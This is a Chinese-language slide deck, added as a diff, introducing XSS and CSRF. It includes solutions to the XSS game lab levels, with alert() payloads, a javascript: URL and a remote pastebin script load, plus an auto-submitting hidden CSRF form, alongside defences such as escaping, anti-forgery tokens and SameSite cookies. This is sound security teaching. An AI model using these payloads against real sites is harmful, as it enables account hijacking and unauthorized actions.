@@ -1,0 +1,972 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>XSS &amp; CSRF</title>
+    <meta charset="utf-8">
+    <script src="/static/hljs/hljs.js"></script>
+    <link rel="icon" href="/static/favicon.ico" type="image/x-icon"/>
+    <link rel="stylesheet" type="text/css" href="/static/hljs/hljs.css">
+    <script type="text/javascript">
+      hljs.initHighlightingOnLoad()
+    </script>
+
+    <script>
+      var notesEnabled =  false ;
+    </script>
+    <script src="/static/slide.js"></script>
+
+
+    
+  </head>
+
+  <body style="display: none">
+    <section class='slides layout-widescreen'>
+      <article>
+        <h1>XSS &amp; CSRF</h1>
+
+        
+          <h3>前端安全简介 </h3>
+        
+
+        
+          <h3>24 July 2019
+        </h3>
+        
+
+        <p class="misc">
+          
+            
+
+            CJ Ting
+          
+        </p>
+      </article>
+
+      
+        <article >
+          
+            <h2>XSS</h2>
+          
+
+          <span class="pagenumber">2</span>
+        </article>
+      
+        <article >
+          
+            <h3>定义</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        XSS 全称是 <i>Cross Site Script</i>，跨站点脚本，因为缩写和 CSS 重名，所以业界一般称为 XSS。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        简单来说：<b>在别人的网站执行任意 JS</b>。
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">3</span>
+        </article>
+      
+        <article >
+          
+            <h3>举个栗子</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        一个典型的 <i>反射型</i> XSS 漏洞。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        <a href="https://xss-doc.appspot.com/demo/2" target="_blank">xss-doc.appspot.com/demo/2</a>
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">4</span>
+        </article>
+      
+        <article >
+          
+            <h3>如果我是攻击者</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        我该怎样利用这个漏洞？
+      
+    </p>
+  
+
+            
+              
+  <ul>
+  
+    <li>诱导用户访问我的网页，嵌入隐藏的 iframe</li>
+  
+    <li>直接构造相关 URL，诱导用户点击</li>
+  
+    <li>...</li>
+  
+  </ul>
+
+            
+              
+  
+    <p>
+      
+        
+        上面列出的是最明显的方法，攻防领域不断在演进，这是一个技巧和智慧层出不迭的领域。
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">5</span>
+        </article>
+      
+        <article >
+          
+            <h3>执行任意 JS 有什么危害</h3>
+
+            
+              
+  <ul>
+  
+    <li>任意控制目标网站的行为</li>
+  
+    <li>窃取机密数据</li>
+  
+    <li>以用户的身份执行动作</li>
+  
+    <li>...</li>
+  
+  </ul>
+
+            
+          
+
+          <span class="pagenumber">6</span>
+        </article>
+      
+        <article >
+          
+            <h2>XSS Lab</h2>
+          
+
+          <span class="pagenumber">7</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 1</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        <a href="https://xss-game.appspot.com/level1/frame" target="_blank">xss-game.appspot.com/level1/frame</a>
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">8</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 1 Result</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        可以看到，网站对于用户输入完全不做任何处理。
+      
+    </p>
+  
+
+            
+              
+  
+    <div class="code">
+      <pre><code class="lang-html">&lt;script&gt;alert()&lt;/script&gt;</code></pre>
+    </div>
+  
+
+            
+          
+
+          <span class="pagenumber">9</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 2</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        <a href="https://xss-game.appspot.com/level2/frame" target="_blank">xss-game.appspot.com/level2/frame</a>
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">10</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 2 Result</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        这是一个典型的 <i>存储型</i> XSS 漏洞。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        这里牵涉到一个 JS 的小知识，通过 <code class="inline">innerHTML</code> 添加的 script 标签不会得到执行。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        因此，我们需要使用别的标签来执行 JS，最方便的就是 img 标签。
+      
+    </p>
+  
+
+            
+              
+  
+    <div class="code">
+      <pre><code class="lang-html">&lt;img src=&#34;&#34; onerror=&#34;alert()&#34; /&gt;</code></pre>
+    </div>
+  
+
+            
+          
+
+          <span class="pagenumber">11</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 3</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        <a href="https://xss-game.appspot.com/level3/frame" target="_blank">xss-game.appspot.com/level3/frame</a>
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">12</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 3 Result</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        这是第三种类型的 XSS，<i>DOM</i> XSS。即完全不经过服务器，客户端代码直接从客户端取得输入。
+      
+    </p>
+  
+
+            
+              
+  
+    <div class="code">
+      <pre><code class="lang-html">https://xss-game.appspot.com/level3/frame#3.jpg&#39;%20onload=%22alert()%22%20abc=&#39;</code></pre>
+    </div>
+  
+
+            
+          
+
+          <span class="pagenumber">13</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 4</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        <a href="https://xss-game.appspot.com/level4/frame" target="_blank">xss-game.appspot.com/level4/frame</a>
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">14</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 4 Result</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        这一关需要观察网页的特征，查看源代码。
+      
+    </p>
+  
+
+            
+              
+  
+    <div class="code">
+      <pre><code class="lang-html">https://xss-game.appspot.com/level4/frame?timer=1%27)%3Balert(%27</code></pre>
+    </div>
+  
+
+            
+          
+
+          <span class="pagenumber">15</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 5</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        <a href="https://xss-game.appspot.com/level5/frame" target="_blank">xss-game.appspot.com/level5/frame</a>
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">16</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 5 Result</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        同样需要研究源代码，寻找 XSS 漏洞。
+      
+    </p>
+  
+
+            
+              
+  
+    <div class="code">
+      <pre><code class="lang-html">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()</code></pre>
+    </div>
+  
+
+            
+          
+
+          <span class="pagenumber">17</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 6</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        <a href="https://xss-game.appspot.com/level6/frame" target="_blank">xss-game.appspot.com/level6/frame</a>
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">18</span>
+        </article>
+      
+        <article >
+          
+            <h3>Level 6 Result</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        目标网站根据 URL 动态加载资源，虽然做了检查，但是百密一疏。
+      
+    </p>
+  
+
+            
+              
+  
+    <div class="code">
+      <pre><code class="lang-html">https://xss-game.appspot.com/level6/frame#//pastebin.com/raw/ApUeAjZg</code></pre>
+    </div>
+  
+
+            
+          
+
+          <span class="pagenumber">19</span>
+        </article>
+      
+        <article >
+          
+            <h3>防范</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        防范 XSS 的一个重要方法就是 <b>Escape</b>，转义。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        <b>对于任何用户输入的内容，都要认为不安全</b>，并根据上下文进行转义。这是很繁重的工作，一般交给框架自动处理。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        其他一些措施：
+      
+    </p>
+  
+
+            
+              
+  <ul>
+  
+    <li>对于所有含有用户输入的页面，都需要正确指定 <code class="inline">Content-Type</code> 头。没有这个头，很多浏览器会自动猜测类型，这可能会导致将内容解释成 HTML，从而引发 XSS。</li>
+  
+    <li>对于所有用户提供的 URL，需要保证有正确的协议。恶意用户可能会使用 <code class="inline">javascript:</code> 来执行 JS。</li>
+  
+    <li>对于用户上传的东西，使用不同的域名来访问</li>
+  
+    <li>...</li>
+  
+  </ul>
+
+            
+          
+
+          <span class="pagenumber">20</span>
+        </article>
+      
+        <article >
+          
+            <h3>推荐一个小工具</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        XSS 很多时候攻击的一个要点是要绕过服务器的转义，因此，客户端转义就是一个很有效的手段。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        <a href="https://xssor.io" target="_blank">xssor.io</a>
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">21</span>
+        </article>
+      
+        <article >
+          
+            <h2>CSRF</h2>
+          
+
+          <span class="pagenumber">22</span>
+        </article>
+      
+        <article >
+          
+            <h3>定义</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        CSRF 全称是 <i>Cross-Site Request Forgery</i>，跨站点请求伪造。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        简单来说：<b>诱导用户在目标网站上执行非本意操作</b>。
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">23</span>
+        </article>
+      
+        <article >
+          
+            <h3>举个栗子</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        某个银行网站 A 的转账使用 <code class="inline">GET /send?target=&amp;amount=</code> 接口，用户 B 已经登陆 A 网站。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        我们诱导用户 B 点击链接 <code class="inline">/send?target=me&amp;amount=1000</code>，那么，在一切不知情的情况下，用户将损失 1000 元。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        或者，我们可以诱导用户访问某个页面，使用 <code class="inline">&lt;img src=&#34;/send?target=me&amp;amount=1000&#34; /&gt;</code>。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        又或者，我们可以给用户发送一封电子邮件，等等等等。
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">24</span>
+        </article>
+      
+        <article >
+          
+            <h3>GET 换成 POST</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        一般来说，操作资源的接口都是 POST，无法通过点击 URL 触发。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        不要紧，我们可以构造页面，使用 <code class="inline">form</code> 自动提交。
+      
+    </p>
+  
+
+            
+              
+  
+    <div class="code">
+      <pre><code class="lang-html">&lt;iframe style=&#34;display: none&#34; name=&#34;iframe&#34;&gt;&lt;/iframe&gt;
+&lt;form action=&#34;https://www.baidu.com&#34; method=&#34;post&#34; target=&#34;iframe&#34;&gt;&lt;/form&gt;
+&lt;script type=&#34;text/javascript&#34;&gt;
+  document.querySelector(&#34;form&#34;).submit()
+&lt;/script&gt;</code></pre>
+    </div>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        这里使用了 form 的 target 属性将结果显示在 iframe 中。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        怎样诱导用户进入这个页面是技术以外的问题了。
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">25</span>
+        </article>
+      
+        <article >
+          
+            <h3>防范</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        CSRF 的本质是第三方触发了用户对于目标网站的请求，该请求会携带 Cookie 因此鉴权不会有问题，从而导致了非用户本意的行为。
+      
+    </p>
+  
+
+            
+              
+  <ul>
+  
+    <li>Anti-Forgery Token: 确保这个请求确实来自于我们自己的网站</li>
+  
+    <li>SameSite Cookie Attribute: 确保第三方站点的请求不会携带 Cookie</li>
+  
+  </ul>
+
+            
+          
+
+          <span class="pagenumber">26</span>
+        </article>
+      
+        <article >
+          
+            <h3>Anti-Forgery Token</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        服务端在渲染网页时，会生成一个 Token，存放着页面中以及 Cookie 中。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        客户端在请求时，会携带这个 Token，服务端会校验，如果 Token 不匹配，说明该请求并非来自于我们自己的站点。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        这个方案简单有效，而且一般来说框架可以替我们透明处理掉。
+      
+    </p>
+  
+
+            
+          
+
+          <span class="pagenumber">27</span>
+        </article>
+      
+        <article >
+          
+            <h3>SameSite Cookie Attribute</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        Chrome 给 <code class="inline">Set-Cookie</code> 增加了一个新的属性 <code class="inline">SameSite</code>，取值如下：
+      
+    </p>
+  
+
+            
+              
+  <ul>
+  
+    <li><code class="inline">Strict</code>: 第三方域名发起的请求中将不会携带任何目标域名的 Cookie</li>
+  
+    <li><code class="inline">Lax</code>: GET 请求会携带，其他请求不会</li>
+  
+  </ul>
+
+            
+          
+
+          <span class="pagenumber">28</span>
+        </article>
+      
+        <article >
+          
+            <h3>总结</h3>
+
+            
+              
+  
+    <p>
+      
+        
+        安全是非常复杂的问题，漏洞往往隐藏在细微之处。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        事发之前，都是岁月静好，一切正常。
+      
+    </p>
+  
+
+            
+              
+  
+    <p>
+      
+        
+        我们要做的就是
+      
+    </p>
+  
+
+            
+              
+  <ul>
+  
+    <li>坚持使用 Best Practices，一些最佳实践看起来可能有些冗余，但这一切背后都有原因</li>
+  
+    <li>不要偷懒，该转义的地方要转义，该校验的地方要校验</li>
+  
+  </ul>
+
+            
+          
+
+          <span class="pagenumber">29</span>
+        </article>
+      
+
+      <article>
+        <h3>Thank you</h3>
+
+        <p class="misc">
+          
+            
+
+            CJ Ting
+          
+        </p>
+      </article>
+    </section>
+
+    <div id="help">
+      Use the left and right arrow keys or click the left and right
+      edges of the page to navigate between slides.<br>
+      (Press 'H' or navigate to hide this message.)
+    </div>
+
+    
+    <div style="display: none">
+      <script type="text/javascript" src="https://s23.cnzz.com/z_stat.php?id=1277831247&web_id=1277831247"></script>
+    </div>
+  </body>
+</html>
